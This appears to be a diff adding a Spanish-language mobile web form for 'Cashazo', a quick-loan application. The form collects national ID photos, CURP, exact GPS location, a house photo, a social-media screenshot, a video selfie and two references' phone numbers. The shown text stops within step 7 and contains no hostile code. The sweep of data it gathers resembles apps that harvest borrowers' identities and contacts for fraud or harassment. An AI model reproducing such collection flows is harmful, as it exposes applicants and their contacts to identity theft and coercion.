@@ -1,0 +1,1254 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,maximum-scale=1,user-scalable=no">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="theme-color" content="#22c55e">
+<title>Cashazo - Crédito Rápido</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+html,body{width:100%;min-height:100%;margin:0;padding:0}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+  background:#f0f0f0;color:#1a1a1a;font-size:15px;line-height:1.5;overflow-x:hidden
+}
+input,select,textarea,button{font-family:inherit;font-size:inherit;-webkit-appearance:none;appearance:none;border-radius:0}
+input[type=number]{-moz-appearance:textfield}
+input::-webkit-outer-spin-button,input::-webkit-inner-spin-button{-webkit-appearance:none;margin:0}
+select{
+  background-image:url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23666' stroke-width='2'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+  background-repeat:no-repeat;background-position:right 12px center;background-size:20px;padding-right:40px
+}
+
+/* HEADER */
+.header{
+  background:linear-gradient(135deg,#1a7a3a 0%,#22c55e 60%,#16a34a 100%);
+  color:white;padding:20px 16px 24px;text-align:center;
+  box-shadow:0 4px 16px rgba(0,0,0,0.2);position:relative;overflow:hidden
+}
+.header::before{
+  content:'';position:absolute;top:-30px;right:-30px;width:120px;height:120px;
+  background:rgba(255,255,255,0.08);border-radius:50%
+}
+.header::after{
+  content:'';position:absolute;bottom:-20px;left:-20px;width:80px;height:80px;
+  background:rgba(255,255,255,0.06);border-radius:50%
+}
+.logo-img{width:90px;height:90px;object-fit:contain;margin-bottom:8px;position:relative;z-index:1;filter:drop-shadow(0 2px 8px rgba(0,0,0,0.3))}
+.header-title{font-size:26px;font-weight:800;letter-spacing:-0.5px;position:relative;z-index:1}
+.header-sub{font-size:13px;opacity:0.9;position:relative;z-index:1;margin-top:2px}
+
+/* PROGRESS */
+.progress-wrap{padding:14px 16px 0;background:#f0f0f0}
+.progress-bar{display:flex;gap:4px;margin-bottom:4px}
+.progress-bar div{flex:1;height:4px;background:#ddd;border-radius:2px;transition:background 0.3s}
+.progress-bar div.active{background:#22c55e}
+.progress-bar div.done{background:#16a34a}
+.progress-label{font-size:11px;color:#888;text-align:right;margin-bottom:12px}
+
+/* CONTAINER */
+.container{padding:0 12px 80px;max-width:480px;margin:0 auto}
+
+/* CARD */
+.card{background:white;border-radius:14px;padding:20px;margin-bottom:14px;box-shadow:0 2px 8px rgba(0,0,0,0.08)}
+.step{display:none}
+.step.active{display:block;animation:fadeIn 0.3s}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+
+/* STEP HEADER */
+.step-badge{display:inline-flex;align-items:center;gap:6px;background:#f0fdf4;color:#16a34a;
+  padding:5px 12px;border-radius:20px;font-size:12px;font-weight:700;margin-bottom:12px;border:1px solid #bbf7d0}
+.step-title{font-size:20px;font-weight:800;margin-bottom:3px;color:#111}
+.step-desc{font-size:13px;color:#777;margin-bottom:16px}
+
+/* FIELDS */
+.field-group{margin-bottom:14px}
+.field-group label{display:block;font-size:12px;font-weight:700;color:#555;margin-bottom:6px;text-transform:uppercase;letter-spacing:0.4px}
+.field-group input,.field-group select,.field-group textarea{
+  width:100%;padding:14px 12px;border:2px solid #e5e7eb;border-radius:10px;
+  font-size:16px;color:#1a1a1a;background:white;transition:border-color 0.2s,box-shadow 0.2s
+}
+.field-group input:focus,.field-group select:focus,.field-group textarea:focus{
+  outline:none;border-color:#22c55e;box-shadow:0 0 0 3px rgba(34,197,94,0.15)
+}
+.field-group input.error{border-color:#ef4444;background:#fef2f2}
+.field-group textarea{resize:none;height:80px;font-family:inherit}
+.field-row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+
+/* BOXES */
+.info-box{background:#fefce8;border:1px solid #fde047;border-radius:10px;padding:12px;font-size:13px;color:#713f12;margin-bottom:14px;line-height:1.5}
+.info-box strong{color:#451a03}
+.success-box{background:#f0fdf4;border:1px solid #86efac;border-radius:10px;padding:12px;font-size:13px;color:#166534;margin-bottom:14px}
+.error-box{background:#fef2f2;border:1px solid #fca5a5;border-radius:10px;padding:12px;font-size:13px;color:#991b1b;margin-bottom:14px;display:none;font-weight:600}
+
+/* BUTTONS */
+.btn{padding:14px 16px;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;transition:all 0.15s;-webkit-appearance:none;width:100%;display:block;text-align:center}
+.btn-back{background:#f3f4f6;color:#374151;border:2px solid #e5e7eb;width:auto;padding:14px 20px}
+.btn-next{background:linear-gradient(135deg,#22c55e,#16a34a);color:white;box-shadow:0 4px 12px rgba(34,197,94,0.35)}
+.btn-next:active{transform:scale(0.98);background:#16a34a}
+.btn-next:disabled{opacity:0.4;cursor:not-allowed;box-shadow:none}
+.btn-gray{background:#6b7280;color:white}
+.btn-orange{background:#f97316;color:white}
+.btn-red{background:#ef4444;color:white}
+.btn-row{display:flex;gap:10px;margin-top:16px}
+.btn-row .btn-back{flex-shrink:0}
+.btn-row .btn-next{flex:1}
+
+/* UPLOAD */
+.upload-zone{border:2px dashed #d1d5db;border-radius:10px;padding:18px 16px;text-align:center;cursor:pointer;background:#f9fafb;transition:all 0.2s;margin-bottom:8px;position:relative}
+.upload-zone:active,.upload-zone.filled{border-color:#22c55e;background:#f0fdf4}
+.upload-icon{font-size:28px;margin-bottom:6px}
+.upload-text{font-size:13px;color:#666;line-height:1.4}
+.upload-hint{font-size:11px;color:#9ca3af;margin-top:4px}
+.upload-ok{position:absolute;top:10px;right:12px;background:#22c55e;color:white;border-radius:50%;width:22px;height:22px;display:none;align-items:center;justify-content:center;font-size:12px;font-weight:700}
+.upload-zone.filled .upload-ok{display:flex}
+.preview-img{width:100%;max-height:140px;object-fit:cover;border-radius:8px;margin-top:8px;border:2px solid #22c55e;display:none}
+.preview-img.shown{display:block}
+input[type="file"]{display:none}
+
+/* DOC EXAMPLE */
+.doc-example{background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;padding:10px;margin-bottom:12px;display:flex;gap:10px;align-items:center}
+.doc-example-img{width:70px;height:45px;object-fit:cover;border-radius:6px;flex-shrink:0;border:1px solid #cbd5e1}
+.doc-example-text{font-size:12px;color:#475569;line-height:1.4}
+.doc-example-text strong{color:#1e293b;display:block;margin-bottom:2px}
+
+/* LOCATION */
+.loc-box{border:2px solid #d1d5db;border-radius:10px;padding:14px;margin-bottom:14px;background:#f9fafb;font-size:14px;color:#374151;transition:all 0.3s}
+.loc-box.ok{border-color:#22c55e;background:#f0fdf4;color:#166534}
+.loc-box.err{border-color:#ef4444;background:#fef2f2;color:#991b1b}
+.loc-precision{font-size:12px;margin-top:6px;display:flex;align-items:center;gap:6px}
+.precision-bar{flex:1;height:6px;background:#e5e7eb;border-radius:3px;overflow:hidden}
+.precision-fill{height:100%;border-radius:3px;transition:width 0.5s,background 0.5s}
+
+/* VERIFY BADGE */
+.badge{display:inline-block;padding:4px 10px;border-radius:20px;font-size:12px;font-weight:700;margin-top:8px}
+.badge.pending{background:#fef9c3;color:#713f12}
+.badge.ok{background:#dcfce7;color:#166534}
+.badge.err{background:#fee2e2;color:#991b1b}
+
+/* WA CODE BOX */
+.wa-code-display{background:#1a1a2e;color:#22c55e;border-radius:12px;padding:20px;text-align:center;margin:16px 0;font-family:monospace}
+.wa-code-display .code-label{font-size:12px;color:#86efac;margin-bottom:8px;text-transform:uppercase;letter-spacing:1px}
+.wa-code-display .code-number{font-size:36px;font-weight:700;letter-spacing:10px;color:#4ade80}
+.wa-code-display .code-note{font-size:11px;color:#86efac;margin-top:8px;opacity:0.8}
+
+/* VIDEO */
+.video-container{position:relative;background:#000;border-radius:10px;overflow:hidden;aspect-ratio:4/3;width:100%;margin-bottom:12px;display:none}
+.video-container.active{display:block}
+video{width:100%;height:100%;object-fit:cover}
+.video-status{font-size:13px;color:#666;text-align:center;margin:10px 0;min-height:20px}
+.video-status.err{color:#ef4444}
+.video-status.ok{color:#22c55e;font-weight:700}
+
+/* MAP PREVIEW */
+.map-preview{width:100%;height:150px;border-radius:10px;border:2px solid #22c55e;object-fit:cover;margin-bottom:10px}
+
+/* RECIBO */
+.recibo{background:white;border:2px solid #e5e7eb;border-radius:12px;padding:20px;position:relative;overflow:hidden}
+.recibo::before{content:'CASHAZO';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%) rotate(-30deg);font-size:60px;font-weight:900;color:rgba(34,197,94,0.06);white-space:nowrap;pointer-events:none;z-index:0;letter-spacing:8px}
+.recibo-logo{display:flex;align-items:center;gap:10px;margin-bottom:16px;border-bottom:2px dashed #e5e7eb;padding-bottom:14px}
+.recibo-logo img{width:50px;height:50px;object-fit:contain}
+.recibo-logo-text{font-size:22px;font-weight:900;color:#1a7a3a}
+.recibo-logo-sub{font-size:11px;color:#666}
+.recibo-row{display:flex;justify-content:space-between;align-items:flex-start;padding:8px 0;border-bottom:1px solid #f3f4f6;font-size:13px;position:relative;z-index:1}
+.recibo-row:last-child{border-bottom:none}
+.recibo-label{color:#6b7280;font-weight:600}
+.recibo-val{color:#1a1a1a;font-weight:700;text-align:right;max-width:60%}
+.recibo-folio{background:#f0fdf4;border-radius:8px;padding:12px;text-align:center;margin-bottom:16px;position:relative;z-index:1}
+.recibo-folio-label{font-size:11px;color:#6b7280;margin-bottom:2px}
+.recibo-folio-num{font-size:20px;font-weight:900;color:#16a34a;font-family:monospace;letter-spacing:2px}
+.recibo-stamp{border:3px solid #22c55e;border-radius:8px;padding:8px 16px;display:inline-block;color:#16a34a;font-weight:800;font-size:14px;margin:12px auto;display:block;text-align:center;max-width:200px;position:relative;z-index:1}
+
+/* SUCCESS PAGE */
+.success-page{text-align:center;padding:10px 0 20px}
+.success-icon{font-size:60px;margin-bottom:12px}
+.success-title{font-size:22px;font-weight:800;color:#22c55e;margin-bottom:8px}
+.success-text{font-size:14px;color:#666;margin-bottom:20px;line-height:1.6}
+.folio-box{background:#f0fdf4;border:2px solid #86efac;border-radius:10px;padding:14px;margin-bottom:16px;font-family:monospace}
+.folio-label{font-size:11px;color:#6b7280;margin-bottom:4px}
+.folio-num{font-size:22px;font-weight:900;color:#16a34a;letter-spacing:2px}
+
+/* LOGO WATERMARK (en campos de doc) */
+.doc-section{position:relative}
+
+/* MOBILE SAFE AREA */
+@supports(padding:max(0px)){
+  .bottom-safe{padding-bottom:max(80px,calc(80px + env(safe-area-inset-bottom)))}
+}
+
+/* AMOUNTS GRID */
+.amounts-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:16px}
+.amount-btn{border:2px solid #e5e7eb;border-radius:10px;padding:14px 8px;text-align:center;cursor:pointer;background:white;transition:all 0.15s;font-weight:700;font-size:15px;color:#374151}
+.amount-btn.selected{border-color:#22c55e;background:#f0fdf4;color:#16a34a}
+.amount-btn .amount-note{font-size:11px;font-weight:400;color:#9ca3af;margin-top:2px}
+.amount-btn.selected .amount-note{color:#86efac}
+
+/* STICKY BOTTOM AREA */
+.sticky-buttons{position:sticky;bottom:0;background:linear-gradient(to top,#f0f0f0 70%,transparent);padding:12px 12px 20px;margin:-12px -12px 0;z-index:10}
+
+/* JSON DISPLAY */
+.json-box{background:#1a1a2e;color:#0f0;border-radius:10px;padding:16px;font-family:monospace;font-size:11px;line-height:1.6;overflow-x:auto;max-height:300px;overflow-y:auto;margin:16px 0;border:1px solid #22c55e}
+.json-copy{margin-top:10px}
+.json-copy button{width:100%;padding:10px;background:#22c55e;color:white;border:none;border-radius:6px;cursor:pointer;font-weight:700}
+</style>
+</head>
+<body>
+
+<!-- HEADER CON LOGO -->
+<div class="header">
+  <img class="logo-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 200'%3E%3Ccircle cx='100' cy='100' r='95' fill='%23f0fdf4' stroke='%2322c55e' stroke-width='4'/%3E%3Ctext x='100' y='120' text-anchor='middle' font-size='90' font-family='Arial Black' fill='%2316a34a'%3E%24%3C/text%3E%3C/svg%3E" alt="Cashazo Logo" id="logoImg">
+  <div class="header-title">💚 cashazo</div>
+  <div class="header-sub">Cash al instante · Crédito rápido y seguro</div>
+</div>
+
+<div class="progress-wrap">
+  <div class="progress-bar" id="progressBar"></div>
+  <div class="progress-label" id="progressLabel">Paso 1 de 7</div>
+</div>
+
+<div class="container bottom-safe">
+<div class="card">
+
+  <!-- PASO 1: DATOS PERSONALES -->
+  <div class="step active" id="step1">
+    <div class="step-badge">👤 Paso 1 de 7</div>
+    <div class="step-title">Información Personal</div>
+    <div class="step-desc">Tus datos de contacto básicos</div>
+    
+    <div class="field-group">
+      <label>Nombre completo *</label>
+      <input type="text" id="nombre" placeholder="Juan García Pérez" autocomplete="name">
+    </div>
+    
+    <div class="field-row">
+      <div class="field-group">
+        <label>Teléfono *</label>
+        <input type="tel" id="tel" placeholder="6144123456" inputmode="numeric" maxlength="10">
+      </div>
+      <div class="field-group">
+        <label>WhatsApp *</label>
+        <input type="tel" id="whatsapp" placeholder="6144123456" inputmode="numeric" maxlength="10">
+      </div>
+    </div>
+    
+    <div class="field-group">
+      <label>Correo electrónico</label>
+      <input type="email" id="email" placeholder="tu@correo.com" autocomplete="email" inputmode="email">
+    </div>
+    
+    <div class="field-group">
+      <label>CURP *</label>
+      <input type="text" id="curp" placeholder="GAPJ900101HCHRRL09" maxlength="18" style="text-transform:uppercase;letter-spacing:1px;font-family:monospace;font-size:15px">
+    </div>
+
+    <div class="error-box" id="err1"></div>
+    
+    <div class="sticky-buttons">
+      <button class="btn btn-next" onclick="nextStep(1)">Siguiente →</button>
+    </div>
+  </div>
+
+  <!-- PASO 2: VERIFICACIÓN WHATSAPP -->
+  <div class="step" id="step2">
+    <div class="step-badge">📱 Paso 2 de 7</div>
+    <div class="step-title">Verificación WhatsApp</div>
+    <div class="step-desc">Confirmamos que el número esté activo</div>
+    
+    <div class="info-box">
+      <strong>⚠️ Cómo funciona:</strong> Al dar clic en el botón se generará tu código y se abrirá WhatsApp con el mensaje listo. Solo dale <strong>Enviar</strong> ahí y regresa aquí a confirmar el código.
+    </div>
+
+    <div class="field-group">
+      <label>Número a verificar</label>
+      <input type="tel" id="waDisplay" readonly style="background:#f3f4f6;font-size:18px;text-align:center;font-weight:700">
+    </div>
+    
+    <button class="btn btn-next" id="btnSendCode" onclick="sendWACode()">📲 Generar código y abrir WhatsApp</button>
+
+    <!-- EL CÓDIGO SE MUESTRA EN PANTALLA TAMBIÉN -->
+    <div id="waCodeDisplay" style="display:none">
+      <div class="wa-code-display">
+        <div class="code-label">Tu código de verificación</div>
+        <div class="code-number" id="codeVisible">------</div>
+        <div class="code-note">WhatsApp ya se abrió con este código · Envíalo y vuelve aquí</div>
+      </div>
+      
+      <div class="field-group" style="margin-top:12px">
+        <label>Confirma el código que enviaste *</label>
+        <input type="text" id="waCode" placeholder="000000" maxlength="6" inputmode="numeric" style="font-size:28px;text-align:center;letter-spacing:10px;font-family:monospace;padding:16px">
+      </div>
+      <button class="btn btn-next" onclick="verifyWACode()" style="margin-bottom:10px">✓ Confirmar código</button>
+    </div>
+
+    <div id="waBadge"></div>
+    <div class="error-box" id="err2"></div>
+
+    <div class="btn-row">
+      <button class="btn btn-back" onclick="prevStep()">← Atrás</button>
+      <button class="btn btn-next" id="btn2Next" disabled onclick="nextStep(2)">Continuar →</button>
+    </div>
+  </div>
+
+  <!-- PASO 3: UBICACIÓN GPS -->
+  <div class="step" id="step3">
+    <div class="step-badge">📍 Paso 3 de 7</div>
+    <div class="step-title">Tu Ubicación</div>
+    <div class="step-desc">Activa el GPS de tu teléfono antes de continuar</div>
+    
+    <div class="info-box">
+      <strong>📡 Importante:</strong> Necesitamos saber exactamente dónde estás. Activa tu GPS antes de presionar el botón. Si estás en exterior la precisión mejora.
+    </div>
+
+    <div class="loc-box" id="locBox">
+      <div id="locStatus" style="color:#6b7280">Sin GPS capturado aún</div>
+    </div>
+
+    <button class="btn btn-next" id="btnGPS" onclick="getGPS()" style="margin-bottom:14px">📍 Obtener GPS ahora</button>
+    <button class="btn btn-next" id="btnOpenMaps" onclick="openGoogleMaps()" style="display:none;background:#3b82f6;margin-bottom:14px">🗺️ Abrir en Google Maps</button>
+
+    <div class="field-group">
+      <label>Tu domicilio completo *</label>
+      <textarea id="domicilio" placeholder="Ej: Blvd. Teófilo Borunda #456, Col. Valle del Sol, Ciudad Juárez, Chih."></textarea>
+    </div>
+
+    <div class="error-box" id="err3"></div>
+
+    <div class="btn-row">
+      <button class="btn btn-back" onclick="prevStep()">← Atrás</button>
+      <button class="btn btn-next" id="btn3Next" disabled onclick="nextStep(3)">Continuar →</button>
+    </div>
+  </div>
+
+  <!-- PASO 4: DOCUMENTOS -->
+  <div class="step" id="step4">
+    <div class="step-badge">📄 Paso 4 de 7</div>
+    <div class="step-title">Documentos</div>
+    <div class="step-desc">Fotos claras y completas de cada documento</div>
+
+    <!-- INE FRENTE -->
+    <div style="margin-bottom:18px">
+      <div style="font-weight:700;font-size:14px;margin-bottom:8px;color:#1a1a1a">📇 INE — Frente *</div>
+      <div class="doc-example">
+        <div style="width:70px;height:45px;background:linear-gradient(135deg,#dc2626,#b91c1c);border-radius:6px;display:flex;align-items:center;justify-content:center;flex-shrink:0">
+          <span style="color:white;font-size:10px;font-weight:700;text-align:center">INE<br>MEXICO</span>
+        </div>
+        <div class="doc-example-text">
+          <strong>¿Cómo debe verse?</strong>
+          Tu foto, nombre completo, CURP y clave de elector visibles. Sin dedos tapando datos.
+        </div>
+      </div>
+      <div class="upload-zone" onclick="document.getElementById('ineF').click()" id="zoneIneF">
+        <div class="upload-ok">✓</div>
+        <div class="upload-icon">📷</div>
+        <div class="upload-text">Toca para subir foto del frente del INE</div>
+        <div class="upload-hint">JPG o PNG · Cámara o galería</div>
+      </div>
+      <input type="file" id="ineF" accept="image/*" capture="environment" onchange="uploadDoc(this,'IneF')">
+      <img id="prevIneF" class="preview-img">
+    </div>
+
+    <!-- INE REVERSO -->
+    <div style="margin-bottom:18px">
+      <div style="font-weight:700;font-size:14px;margin-bottom:8px;color:#1a1a1a">📇 INE — Reverso *</div>
+      <div class="doc-example">
+        <div style="width:70px;height:45px;background:linear-gradient(135deg,#1d4ed8,#1e40af);border-radius:6px;display:flex;align-items:center;justify-content:center;flex-shrink:0">
+          <span style="color:white;font-size:9px;font-weight:700;text-align:center">INE<br>REVERSO</span>
+        </div>
+        <div class="doc-example-text">
+          <strong>¿Cómo debe verse?</strong>
+          El código de barras y dirección del padrón electoral deben ser legibles.
+        </div>
+      </div>
+      <div class="upload-zone" onclick="document.getElementById('ineR').click()" id="zoneIneR">
+        <div class="upload-ok">✓</div>
+        <div class="upload-icon">📷</div>
+        <div class="upload-text">Toca para subir foto del reverso del INE</div>
+        <div class="upload-hint">JPG o PNG · Cámara o galería</div>
+      </div>
+      <input type="file" id="ineR" accept="image/*" capture="environment" onchange="uploadDoc(this,'IneR')">
+      <img id="prevIneR" class="preview-img">
+    </div>
+
+    <!-- RECIBO CFE/TELMEX -->
+    <div style="margin-bottom:18px">
+      <div style="font-weight:700;font-size:14px;margin-bottom:8px;color:#1a1a1a">🧾 Recibo de servicio (CFE, Telmex, agua) *</div>
+      <div class="doc-example">
+        <div style="width:70px;height:45px;background:linear-gradient(135deg,#f59e0b,#d97706);border-radius:6px;display:flex;align-items:center;justify-content:center;flex-shrink:0">
+          <span style="color:white;font-size:10px;font-weight:700;text-align:center">CFE<br>RECIBO</span>
+        </div>
+        <div class="doc-example-text">
+          <strong>¿Cómo debe verse?</strong>
+          Que se vea tu nombre y la dirección de servicio. Máximo 3 meses de antigüedad.
+        </div>
+      </div>
+      <div class="upload-zone" onclick="document.getElementById('recServ').click()" id="zoneRecServ">
+        <div class="upload-ok">✓</div>
+        <div class="upload-icon">💡</div>
+        <div class="upload-text">Toca para subir recibo de CFE, Telmex o agua</div>
+        <div class="upload-hint">Máximo 3 meses de antigüedad</div>
+      </div>
+      <input type="file" id="recServ" accept="image/*" capture="environment" onchange="uploadDoc(this,'RecServ')">
+      <img id="prevRecServ" class="preview-img">
+    </div>
+
+    <!-- RED SOCIAL -->
+    <div style="margin-bottom:18px">
+      <div style="font-weight:700;font-size:14px;margin-bottom:8px;color:#1a1a1a">📱 Perfil red social *</div>
+      <div class="doc-example">
+        <div style="width:70px;height:45px;background:linear-gradient(135deg,#7c3aed,#6d28d9);border-radius:6px;display:flex;align-items:center;justify-content:center;flex-shrink:0">
+          <span style="color:white;font-size:10px;font-weight:700;text-align:center">FB / IG<br>PERFIL</span>
+        </div>
+        <div class="doc-example-text">
+          <strong>¿Cómo debe verse?</strong>
+          Captura de pantalla de tu Facebook, Instagram o TikTok. Que se vea tu nombre y foto.
+        </div>
+      </div>
+      <div class="upload-zone" onclick="document.getElementById('social').click()" id="zoneSocial">
+        <div class="upload-ok">✓</div>
+        <div class="upload-icon">📲</div>
+        <div class="upload-text">Toca para subir tu perfil de red social</div>
+        <div class="upload-hint">Facebook, Instagram o TikTok</div>
+      </div>
+      <input type="file" id="social" accept="image/*" onchange="uploadDoc(this,'Social')">
+      <img id="prevSocial" class="preview-img">
+    </div>
+
+    <!-- FOTO CASA -->
+    <div style="margin-bottom:4px">
+      <div style="font-weight:700;font-size:14px;margin-bottom:8px;color:#1a1a1a">🏠 Foto de tu casa/domicilio *</div>
+      <div class="doc-example">
+        <div style="width:70px;height:45px;background:linear-gradient(135deg,#059669,#047857);border-radius:6px;display:flex;align-items:center;justify-content:center;flex-shrink:0">
+          <span style="color:white;font-size:10px;font-weight:700;text-align:center">CASA<br>FRENTE</span>
+        </div>
+        <div class="doc-example-text">
+          <strong>¿Cómo debe verse?</strong>
+          Fachada o entrada principal de tu casa. Que se vea el número exterior si hay.
+        </div>
+      </div>
+      <div class="upload-zone" onclick="document.getElementById('casa').click()" id="zoneCasa">
+        <div class="upload-ok">✓</div>
+        <div class="upload-icon">🏠</div>
+        <div class="upload-text">Toca para subir foto de tu casa</div>
+        <div class="upload-hint">Fachada o entrada principal</div>
+      </div>
+      <input type="file" id="casa" accept="image/*" capture="environment" onchange="uploadDoc(this,'Casa')">
+      <img id="prevCasa" class="preview-img">
+    </div>
+
+    <div class="error-box" id="err4"></div>
+
+    <div class="btn-row">
+      <button class="btn btn-back" onclick="prevStep()">← Atrás</button>
+      <button class="btn btn-next" id="btn4Next" disabled onclick="nextStep(4)">Continuar →</button>
+    </div>
+  </div>
+
+  <!-- PASO 5: VIDEO SELFIE -->
+  <div class="step" id="step5">
+    <div class="step-badge">🎥 Paso 5 de 7</div>
+    <div class="step-title">Video de verificación</div>
+    <div class="step-desc">5 a 10 segundos mirando a la cámara</div>
+    
+    <div class="info-box">
+      <strong>📹 Importante:</strong> El video debe coincidir con tu INE. Habla y di: <em>"Yo, [tu nombre], solicito un crédito en Cashazo"</em>. Buena iluminación.
+    </div>
+
+    <div class="video-container" id="videoLive">
+      <video id="videoStream" playsinline autoplay muted></video>
+    </div>
+    <div class="video-status" id="camStatus">Preparando cámara...</div>
+
+    <div id="videoControls" style="display:none;margin-bottom:12px"></div>
+    <video id="recordedVideo" style="width:100%;border-radius:10px;margin-bottom:12px;border:2px solid #22c55e;display:none" controls playsinline></video>
+
+    <div class="error-box" id="err5"></div>
+
+    <div class="btn-row">
+      <button class="btn btn-back" onclick="prevStep()">← Atrás</button>
+      <button class="btn btn-next" id="btn5Next" disabled onclick="nextStep(5)">Continuar →</button>
+    </div>
+  </div>
+
+  <!-- PASO 6: MONTO -->
+  <div class="step" id="step6">
+    <div class="step-badge">💰 Paso 6 de 7</div>
+    <div class="step-title">Monto Solicitado</div>
+    <div class="step-desc">¿Cuánto necesitas?</div>
+    
+    <div class="info-box">
+      <strong>💡 Ejemplos de préstamos:</strong><br>
+      $3,000 · $5,000 · $10,000<br>
+      <em style="font-size:12px;margin-top:8px;display:block">Un asesor de Cashazo se comunicará contigo para personalizar tu tasa según tu perfil</em>
+    </div>
+
+    <div class="amounts-grid" id="amountsGrid">
+      <div class="amount-btn" onclick="selectAmount('3000',this)">
+        $3,000
+      </div>
+      <div class="amount-btn" onclick="selectAmount('5000',this)">
+        $5,000
+      </div>
+      <div class="amount-btn" onclick="selectAmount('10000',this)">
+        $10,000
+      </div>
+      <div class="amount-btn" onclick="selectAmount('otro',this)" style="grid-column:1/-1">
+        Otro monto<div class="amount-note">Especifícalo abajo</div>
+      </div>
+    </div>
+    <input type="hidden" id="monto">
+
+    <div id="customMonto" style="display:none" class="field-group">
+      <label>Especifica el monto *</label>
+      <input type="number" id="customAmount" placeholder="ej. 8000" min="1000" max="100000" inputmode="numeric">
+    </div>
+
+    <div class="field-group">
+      <label>¿Para qué es el crédito? *</label>
+      <select id="destino">
+        <option value="">-- Selecciona --</option>
+        <option value="Gastos médicos">Gastos médicos</option>
+        <option value="Reparación auto">Reparación auto</option>
+        <option value="Negocio o emprendimiento">Negocio o emprendimiento</option>
+        <option value="Pago de deudas">Pago de deudas</option>
+        <option value="Educación">Educación</option>
+        <option value="Compra de equipo">Compra de equipo</option>
+        <option value="Otro">Otro</option>
+      </select>
+    </div>
+
+    <div class="field-group">
+      <label>Ocupación *</label>
+      <input type="text" id="ocupacion" placeholder="Empleado, comerciante, independiente..." required>
+    </div>
+
+    <div class="field-group">
+      <label>¿Cuánto ganas mensualmente? *</label>
+      <input type="number" id="ingresos" placeholder="ej. 15000" min="1000" inputmode="numeric" required>
+      <div style="font-size:11px;color:#666;margin-top:6px">Ayuda a Cashazo a validar tu solicitud</div>
+    </div>
+
+    <div class="error-box" id="err6"></div>
+
+    <div class="btn-row">
+      <button class="btn btn-back" onclick="prevStep()">← Atrás</button>
+      <button class="btn btn-next" onclick="nextStep(6)">Continuar →</button>
+    </div>
+  </div>
+
+  <!-- PASO 7: REFERENCIAS Y TÉRMINOS -->
+  <div class="step" id="step7">
+    <div class="step-badge">👥 Paso 7 de 7</div>
+    <div class="step-title">Referencias y Aceptación</div>
+    <div class="step-desc">Dos personas que te conozcan y términos</div>
+    
+    <div style="background:#fff;border:3px solid #22c55e;border-radius:14px;padding:18px;margin-bottom:16px;box-shadow:0 4px 12px rgba(34,197,94,0.2)">
+      <div style="font-weight:900;margin-bottom:16px;font-size:16px;color:#16a34a;display:flex;align-items:center;gap:8px">
+        <span>👤</span> Referencia 1
+      </div>
+      <div class="field-group">
+        <label>Nombre completo *</label>
+        <input type="text" id="ref1Name" placeholder="María García López" required style="border:2px solid #22c55e">
+      </div>
+      <div class="field-group">
+        <label>Teléfono (10 dígitos) *</label>
+        <input type="tel" id="ref1Tel" placeholder="6145551234" inputmode="numeric" maxlength="10" required style="border:2px solid #22c55e">
+      </div>
+    </div>
+
+    <div style="background:#fff;border:3px solid #22c55e;border-radius:14px;padding:18px;margin-bottom:16px;box-shadow:0 4px 12px rgba(34,197,94,0.2)">
+      <div style="font-weight:900;margin-bottom:16px;font-size:16px;color:#16a34a;display:flex;align-items:center;gap:8px">
+        <span>👤</span> Referencia 2
+      </div>
+      <div class="field-group">
+        <label>Nombre completo *</label>
+        <input type="text" id="ref2Name" placeholder="Carlos López Méndez" required style="border:2px solid #22c55e">
+      </div>
+      <div class="field-group">
+        <label>Teléfono (10 dígitos) *</label>
+        <input type="tel" id="ref2Tel" placeholder="6145559876" inputmode="numeric" maxlength="10" required style="border:2px solid #22c55e">
+      </div>
+    </div>
+
+    <div style="margin-bottom:16px">
+      <div style="font-weight:900;font-size:16px;color:#1a1a1a;margin-bottom:16px">✓ Aceptar términos</div>
+      
+      <div style="border-radius:12px;overflow:hidden;border:2px solid #e5e7eb;background:#fff">
+        <label style="display:flex;align-items:center;justify-content:space-between;padding:16px;border-bottom:1px solid #e5e7eb;cursor:pointer;transition:all 0.2s" id="label1">
+          <span style="font-size:14px;color:#1a1a1a;font-weight:600">Términos y condiciones</span>
+          <input type="checkbox" id="chk1" style="width:32px;height:32px;accent-color:#22c55e;cursor:pointer" onchange="updateAceptacion()">
+        </label>
+        
+        <label style="display:flex;align-items:center;justify-content:space-between;padding:16px;border-bottom:1px solid #e5e7eb;cursor:pointer;transition:all 0.2s" id="label2">
+          <span style="font-size:14px;color:#1a1a1a;font-weight:600">Contacto por WhatsApp y teléfono</span>
+          <input type="checkbox" id="chk2" style="width:32px;height:32px;accent-color:#22c55e;cursor:pointer" onchange="updateAceptacion()">
+        </label>
+        
+        <label style="display:flex;align-items:center;justify-content:space-between;padding:16px;border-bottom:1px solid #e5e7eb;cursor:pointer;transition:all 0.2s" id="label3">
+          <span style="font-size:14px;color:#1a1a1a;font-weight:600">Documentación verídica</span>
+          <input type="checkbox" id="chk3" style="width:32px;height:32px;accent-color:#22c55e;cursor:pointer" onchange="updateAceptacion()">
+        </label>
+        
+        <label style="display:flex;align-items:center;justify-content:space-between;padding:16px;cursor:pointer;transition:all 0.2s" id="label4">
+          <span style="font-size:14px;color:#1a1a1a;font-weight:600">Verificación GPS</span>
+          <input type="checkbox" id="chk4" style="width:32px;height:32px;accent-color:#22c55e;cursor:pointer" onchange="updateAceptacion()">
+        </label>
+      </div>
+    </div>
+
+    <div class="error-box" id="err7"></div>
+
+    <div style="background:#e0f2fe;border:1px solid #0284c7;border-radius:10px;padding:14px;margin-bottom:14px">
+      <div style="font-size:13px;color:#0c4a6e;line-height:1.6">
+        <strong>📞 Próximos pasos:</strong><br>
